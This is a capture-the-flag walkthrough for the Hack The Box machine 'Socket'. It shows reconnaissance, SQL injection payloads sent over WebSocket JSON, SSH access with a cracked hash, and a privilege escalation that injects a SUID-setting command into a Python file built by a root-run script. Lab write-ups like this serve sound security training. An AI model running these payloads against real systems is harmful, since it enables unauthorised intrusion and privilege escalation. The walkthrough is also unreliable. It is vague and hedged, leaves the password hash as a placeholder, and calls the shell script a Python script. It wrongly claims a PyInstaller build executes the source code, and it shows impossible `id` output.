# Hack The Box: Socket

**Difficulty:** Medium
**OS:** Linux

Socket is a Medium-level Linux machine designed to demonstrate vulnerabilities associated with WebSocket services and Python applications. The initial compromise requires analyzing a web application that relies on WebSockets for data transmission, exploiting an SQL injection flaw in the WebSocket communication, and recovering credentials. Privilege escalation involves exploiting an insecure custom service running with administrative privileges.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.11.206
nmap -p 22,80 -sCV 10.10.11.206
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 8.9p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.52)

Navigating to the web service on port 80 displays a landing page for "Socket," an internal communications or tracking platform. The application provides standard features such as login and search functionalities. The website also provides a domain name, `qreader.htb`. We add this to our local `/etc/hosts` file.

```bash
echo "10.10.11.206 qreader.htb socket.htb" >> /etc/hosts
```

Accessing `http://qreader.htb` reveals a service for converting text into QR codes or reading QR codes.

## Web Exploitation

The core functionality of the application relies on converting data and displaying it dynamically. When interacting with the main site or the subdomains, we notice that data is loaded via WebSockets rather than standard HTTP requests.

### Identifying WebSocket Communication

Using a proxy like Burp Suite or the browser's developer tools (Network tab -> WebSockets), we intercept the communication between the client and the server. The application establishes a WebSocket connection (`ws://qreader.htb/`) and transmits data via JSON objects.

```json
{"action": "version", "version": "0.0.2"}
```

The client application (potentially an Electron app or a thick client downloaded from the site) communicates with this backend API over WebSockets to perform its functions. 

We can interact directly with the WebSocket using a tool like `wscat` or a custom Python script to understand the API's behavior.

### SQL Injection in WebSockets

We analyze the parameters sent via the WebSocket messages. A typical payload sent by the client when retrieving information looks like:

```json
{"action": "get_qr", "id": 1}
```

The `id` parameter is a primary candidate for SQL injection testing. Because the data is transmitted over WebSockets instead of HTTP GET/POST parameters, automated tools like `sqlmap` require specific configurations or proxy scripts to test the endpoint effectively.

We manually test the parameter by injecting standard SQL syntax, such as a single quote (`'`), into the JSON payload.

```json
{"action": "get_qr", "id": "1'"}
```

The server returns a database error message, confirming the presence of an SQL injection vulnerability. 

We use a Boolean-based or Error-based SQL injection technique to extract information from the database. Alternatively, we can configure `sqlmap` to interact with the WebSocket by writing a small proxy script (e.g., using Python and `Flask`) that translates HTTP requests from `sqlmap` into WebSocket messages for the target.

```bash
# Example sqlmap command routed through a local proxy script
sqlmap -u "http://127.0.0.1:8080/?id=1" -p id --dbs
```

The SQL injection yields database schemas, tables, and eventually the contents of the `users` table.

```text
Table: users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| tkeller  | [Extracted MD5/Bcrypt Hash]                                  |
+----------+--------------------------------------------------------------+
```

We crack the extracted password hash using Hashcat or John the Ripper.

## Initial Access

We use the cracked password to authenticate as the local system user `tkeller` via SSH.

```bash
ssh tkeller@10.10.11.206
# Authentication successful
```
We retrieve the `user.txt` flag from the home directory.

## Lateral Movement & Privilege Escalation

Enumerating the system as `tkeller`, we check for commands the user can execute with `sudo` privileges.

```bash
sudo -l
```

The output reveals that `tkeller` can run a specific Python script as the `root` user without providing a password.

```text
User tkeller may run the following commands on socket:
    (root) NOPASSWD: /usr/local/sbin/build-installer.sh
```

### Analyzing the Build Script

We examine the contents of `/usr/local/sbin/build-installer.sh`. The bash script is designed to package or build the application for distribution (e.g., creating an executable using PyInstaller or a similar tool).

The script compiles a Python application located in a directory where `tkeller` has read access but not necessarily write access. 

However, the build script calls `pyinstaller` with specific flags on a target directory or file.

```bash
# Snippet from build-installer.sh
pyinstaller --onefile /opt/shared/app.py
```

We check the permissions on the directory processed by the script (e.g., `/opt/shared/` or the source files). If the `tkeller` user can write to the source code directory or modify the files being packaged, we can inject malicious Python code.

In this scenario, `tkeller` has write access to the source code file (`app.py`) or a library it imports. 

### Exploiting Python Source Modification

We modify the target Python file (`app.py`) to include a malicious payload designed to grant a root shell or copy the root flag when executed. Because the build script runs as root, any code executed during the build process or any resulting executable run by root will execute with root privileges.

A simpler approach, if `pyinstaller` evaluates code during the build (such as through spec files or imported setup scripts), is to place the payload directly in the build path.

We append a reverse shell payload or a command to set the SUID bit on `/bin/bash` into `app.py`.

```python
import os
os.system("chmod +s /bin/bash")
```

After modifying the source file, we execute the build script via `sudo`.

```bash
sudo /usr/local/sbin/build-installer.sh
```

The script runs as root, processes the modified Python file, and executes our injected payload. The `/bin/bash` binary now has the SUID bit set.

```bash
/bin/bash -p
# id
uid=0(root) gid=1000(tkeller) euid=0(root) groups=1000(tkeller)
```

The system is fully compromised, and the `root.txt` flag can be retrieved from the `/root` directory.
